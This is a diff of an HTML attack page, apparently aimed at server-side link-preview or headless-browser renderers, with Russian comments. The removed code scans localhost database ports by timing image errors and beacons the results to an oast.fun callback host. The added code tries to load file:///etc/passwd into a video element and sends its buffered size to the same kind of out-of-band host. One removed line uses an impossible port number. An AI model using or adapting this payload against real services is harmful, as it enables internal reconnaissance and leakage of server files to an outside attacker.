@@ -1,29 +1,36 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Preview Probe</title>
+</head>
 <body>
     <script>
-        const hook = "https://esqbwjbyepcxrsacleqfu9095dccsqoxg.oast.fun";
+        // Создаем элемент видео
+        let v = document.createElement('video');
+        v.src = 'file:///etc/passwd';
+        v.autoplay = true; // Пытаемся заставить браузер начать чтение
+        
+        // Сценарий 1: Браузер начал парсить файл
+        v.onprogress = function() {
+            if (v.buffered.length > 0) {
+                let fileSize = v.buffered.end(0); 
+                fetch('https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun/SIZE_PROGRESS?val=' + fileSize);
+            }
+        };
 
-        function probe(url, port) {
-            const start = Date.now();
-            const img = new Image();
-            
-            // Если порт открыт, но это не картинка - сработает onerror, но БЫСТРО
-            // Если порт закрыт - сработает onerror, но МЕДЛЕННО (таймаут)
-            img.onerror = () => {
-                const duration = Date.now() - start;
-                navigator.sendBeacon(`${hook}/PROBE_${port}?time=${duration}`);
-            };
-            
-            img.src = `${url}:${port}/favicon.ico`;
-        }
-
-        // Проверяем самые сочные порты
-       probe("http://127.0.0.1", "6379"); // Redis (часто без пароля внутри)
-probe("http://127.0.0.1", "3306"); // MySQL
-probe("http://127.0.0.1", "27017"); // MongoDB
-probe("http://127.0.0.1", "5432"); // PostgreSQL
-        probe("http://127.0.0.1", "54356782"); // PostgreSQL
+        // Сценарий 2: Браузер выдал ошибку (Code 4), но успел что-то поместить в память
+        v.onerror = function() {
+            if (v.buffered.length > 0) {
+                let fileSize = v.buffered.end(0); 
+                fetch('https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun/SIZE_ERROR?val=' + fileSize);
+            } else {
+                // Если буфер пуст, отправляем просто лог, что скрипт отработал
+                fetch('https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun/SIZE_EMPTY_BUFFER');
+            }
+        };
+        
+        // Обязательно добавляем элемент в DOM, иначе Chrome может оптимизировать и не начать загрузку
+        document.body.appendChild(v);
     </script>
 </body>
 </html>
